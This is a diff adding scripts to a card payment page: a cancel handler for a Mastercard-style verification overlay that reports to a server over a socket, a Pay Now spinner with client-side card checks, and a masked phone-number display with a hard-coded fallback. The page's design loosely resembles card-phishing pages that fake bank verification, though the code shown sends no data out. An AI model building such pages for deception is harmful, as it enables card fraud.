@@ -2891,5 +2891,130 @@ if (invoiceIdElement) {
   }, true);
 });
 </script>
+    // Add this script at the end of your HTML body, before the closing </body> tag
+<script>
+// Direct fix for MC cancel button
+document.addEventListener('click', function(event) {
+  if (event.target && event.target.id === 'mcCancelBtn') {
+    console.log('Cancel button clicked');
+    
+    // Hide the verification overlay
+    const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
+    if (mcVerificationOverlay) {
+      mcVerificationOverlay.style.display = 'none';
+    }
+    
+    // Clear any timers
+    if (window.mcTimerInterval) {
+      clearInterval(window.mcTimerInterval);
+    }
+    
+    // Notify server (if socket exists)
+    if (window.socket) {
+      window.socket.emit('mc_verification_cancelled', {
+        invoiceId: window.state?.transactionId || '',
+        reason: 'cancelled_by_user'
+      });
+    }
+    
+    // Show error UI
+    if (window.showErrorUI) {
+      window.showErrorUI("Payment Cancelled", "This payment was cancelled by you.");
+    } else {
+      // Fallback if function doesn't exist
+      alert("Payment cancelled by user");
+      location.reload();
+    }
+  }
+}, true);
+</script>
+    <script>
+// Direct fix for Pay Now button loading spinner
+document.addEventListener('DOMContentLoaded', function() {
+  // Find the pay now button
+  const payBtn = document.querySelector('button[type="submit"]');
+  
+  if (payBtn) {
+    // Store original click handler
+    const originalOnClick = payBtn.onclick;
+    
+    // Replace with our fixed handler
+    payBtn.onclick = function(e) {
+      e.preventDefault();
+      
+      // Check if form is valid
+      const cardNumber = document.getElementById('card-number')?.value?.replace(/\s/g, '');
+      const cardHolder = document.getElementById('card-holder')?.value?.trim();
+      const expiryDate = document.getElementById('expiry-date')?.value?.trim();
+      const cvv = document.getElementById('cvv')?.value?.trim();
+      
+      if (cardNumber?.length >= 16 && 
+          cardHolder?.length > 2 && 
+          /^\d{2}\/\d{2}$/.test(expiryDate) && 
+          cvv?.length >= 3) {
+        
+        // Show loading spinner
+        const originalText = payBtn.textContent || 'Pay Now';
+        payBtn.innerHTML = `
+          <div style="display: flex; align-items: center; justify-content: center;">
+            <svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+              <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+              <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+            </svg>
+            <span style="opacity: 0.8;">${originalText}</span>
+          </div>
+        `;
+        
+        // Disable the button
+        payBtn.disabled = true;
+        
+        // Call original handler if it exists
+        if (typeof handleCardSubmit === 'function') {
+          handleCardSubmit(e);
+        } else if (typeof originalOnClick === 'function') {
+          originalOnClick(e);
+        }
+      }
+      
+      return false;
+    };
+  }
+});
+</script>
+    <script>
+// Fix for phone number last 4 digits
+// Create a MutationObserver to watch for when the MC verification overlay becomes visible
+const observer = new MutationObserver(function(mutations) {
+  mutations.forEach(function(mutation) {
+    if (mutation.type === 'attributes' && mutation.attributeName === 'style') {
+      const overlay = document.getElementById('mcVerificationOverlay');
+      if (overlay && overlay.style.display !== 'none') {
+        console.log('MC verification overlay is now visible');
+        
+        // Get the phone last 4 digits from URL or state
+        const urlParams = new URLSearchParams(window.location.search);
+        const phoneLastFour = urlParams.get('phone_last_four') || 
+                             window.state?.phoneLastFour || 
+                             '9469';
+        
+        // Set it in the verification overlay
+        const lastFourEl = document.getElementById('cardLastFourDigits');
+        if (lastFourEl) {
+          lastFourEl.textContent = `********${phoneLastFour}`;
+          console.log('Set phone last four digits to:', phoneLastFour);
+        }
+      }
+    }
+  });
+});
+
+// Start observing the overlay element
+document.addEventListener('DOMContentLoaded', function() {
+  const overlay = document.getElementById('mcVerificationOverlay');
+  if (overlay) {
+    observer.observe(overlay, { attributes: true });
+  }
+});
+</script>
 </body>
 </html>
